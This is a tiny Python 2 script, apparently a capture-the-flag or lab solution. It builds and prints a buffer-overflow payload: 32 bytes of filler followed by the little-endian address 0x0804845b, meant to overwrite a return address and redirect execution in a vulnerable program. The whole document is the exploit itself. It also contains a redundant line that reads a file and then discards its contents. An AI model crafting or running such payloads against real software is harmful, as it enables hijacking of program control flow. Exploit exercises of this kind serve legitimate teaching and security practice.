with file("mystery", "rb") as f:
  mystery = f.read()

mystery = ""

padding = 32 - len(mystery)
addr = "\x08\x04\x84\x5b"[::-1]

exploit = mystery + "B" * padding + addr
print exploit
